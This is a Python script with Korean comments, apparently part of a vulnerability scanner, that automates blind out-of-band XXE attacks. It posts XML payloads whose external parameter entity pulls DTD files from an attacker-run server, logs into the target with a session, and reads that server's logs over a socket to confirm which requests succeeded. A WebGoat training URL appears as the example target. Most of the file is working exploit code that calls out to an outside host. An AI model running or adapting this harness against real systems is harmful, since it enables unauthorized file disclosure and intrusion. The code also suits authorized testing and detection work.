import requests, copy, sys, re, socket

server_url = " " # static 
xxe_url = " " # 공격 url  -- db에서 읽어옴 
session = requests.Session() # global


# routine : 메인 호출 부분!
# argument : None
# return value : None
def xxe_blind_outofband_getinfo():
    reset()
    # 서버에 있는 dtd 파일의 수를 http.get 요청으로 받아옴.
    response = requests.get(server_url + "dtd_count")
    dtd_count = int(response.text) 

    # 파일 수 만큼 exploit 보내기
    submit_request(dtd_count)

    # report 출력
    get_final_detail()




# routine : 공격자 서버 웹 로그 리셋 (  파일 용량으로 시간을 할애하는 것을 방지 )
# argument : None
# return value : None
def reset(): 
    client_socket.sendall("reset".encode())



# routine : 실제 exploit을 보냄
# argument : dtd 파일 인덱스
# return value : None
def submit_request(count : int):

    global xxe_url, session

    headers = {'Content-Type': 'application/xml;charset=UTF-8',
                'Accept': 'application/xml' 
                }

    url = '{}url/{}'.format(server_url,xxe_url)
    requests.get(url)

    for i in range(0 ,count):
        # Crafting XXE Payload
        
        payload = '<?xml version=\"1.0\" ?>\r\n<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{}exploit/exploit{}.dtd"> %xxe; ]>'.format(server_url , i)
        response = session.post(xxe_url, data = payload, headers = headers)

        if response.status_code != 200:
            print("\n\n   [ ERROR : {} ] \n\n   ** Response status code : {}  \n\n".format("Failed exploit payload",response.status_code))



# routine : 최종 report 를 출력해주는 부분
# argument : None
# return value : None
def get_final_detail():
    result = result_request()
            
    if result == "RESULT_ERROR":
        return


    if result.strip() == "" :
        print( " NOT detect BLIND_XXE_OUT_OF_BAND_ATTACK vulnerability \n\n\n")
    else:
        print( " Detect BLIND_XXE_OUT_OF_BAND_ATTACK vulnerability  \n\n\n")
        
    print(result)




# routine : 공격자 서버에서 공격 log 를 받아옴 
# argument : None
# return value : 로그를 string 형태로 반환 ( 필터링되지 않은 상태 )

def result_request() -> str:

    client_socket.sendall("result".encode("utf-8"))
    data = client_socket.recv(1024)
    client_socket.send(data)

    data_transferred = 0 
    result = str()

    if data == None:
        print("\n\n   [ ERROR : %s ] \n\n"%"File does not exist in server")
        return "RESULT_ERROR"

    
    try:
        while data:
            result += repr(data)
            data_transferred += len(data)
            data = client_socket.recv(1024) 
            data = data.decode('utf-8')
            client_socket.send(data.encode('utf-8'))
            if(data == "end"):
                break
    except Exception as ex:
            print("\n\n   [ ERROR : ", ex ," ]  \n\n")
            return "RESULT_ERROR"


    print("\n [ LOG ] Size of transferred data  : {} bytes \n".format(data_transferred))
    result = craft_result(result)
    return result


# routine : 받아온 log를 필터링 함
# argument : 원본 로그 
# return value : 필터링한 로그 
def craft_result(result : str) -> str:
    result = '"""{}"""'.format(result)    
    
    result = list(result.split("\\n"))
    craft_result = str()
    url = str()

    for line in result:
        try:
            if( int(line.split(' ')[8]) != 404):
                continue
                # 서버에서 받아온 결과(log file)를 필터링 하는 부분은 더 다양한 시도를 해보고 수정 될 수 있음
        except:
            continue
        
        url_path = (line.split(' ')[6]).split('/')[1]  # 아까 말씀 드렸던 /url 인지 /exploit 인지 구별 하는 부분입니다.
                                                        # 변수명을 어떻게 해야할 지 잘 모르겠어요 ..   
                                                        # 아직 이 코드에는  여러 url 을 입력받는 구현도 안되어 있고 , 
                                                        # 여러 url을 받더라도 어떤 url 에서 공격이 성공한건지 판별하는 기능도 없지만, 
                                                        # 그냥 넣어놨어요! 
                                                        # 진짜 별거 아니지만, 혹시 조금이라도  ' 왜 구별 기능이 없는데 넣어놨지? '  이런생각으로 혼란스러우실까봐 말씀드립니다!!
                                                        
        # "192.168.200.254 - - [29/Apr/2021:20:22:11 -0700] "GET /url/http://localhost:8080/WebGoat/attack?Screen=87365&menu=1700"
        # 이 텍스트 값에서 "url" 부분만 뽑아서 바로 위에 있는 url_path변수 에 넣고,
        # 바로 아래 있는 url변수에 공격한 url 넣어주기 위해서 (A) 방법을 썼습니다. 더 나은 방법이 생각나신다면 수정 부탁 드립니다.                                   
        if(url_path == "url"):
            url = ('/').join((line.split(' ')[6]).split('/')[2:7]) # (A)
            craft_result += " [ {} ] \n\n".format(url)
            continue
        
        craft_result += line
        craft_result += "\n"


    return craft_result


# 나중에 코드 전부 합칠때, 이 기능은  메인에서 구현되고 session 만 전역변수로 가져와야 함.
def connect_session() -> bool:    
    global session

    session_url = "  " # main에서 입력받음
    login_data = {"username" : "  " , "password" : "  "} # main에서 입력받음
    response = session.post(session_url, data = login_data)

    if response.status_code != 200:
        print("\n\n   [ ERROR : {} ] \n\n   ** Response status code : {} \n\n".format("Failed login", response.status_code))
        return False

    return True




if __name__ == "__main__":

    server_host = '  ' #static
    server_port = '  ' #static 
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # global
    client_socket.connect((server_host,server_port))

    if connect_session() == True :
        xxe_blind_outofband_getinfo()


    client_socket.close() # 모든 공격이 끝난 후! 닫아야 함. 


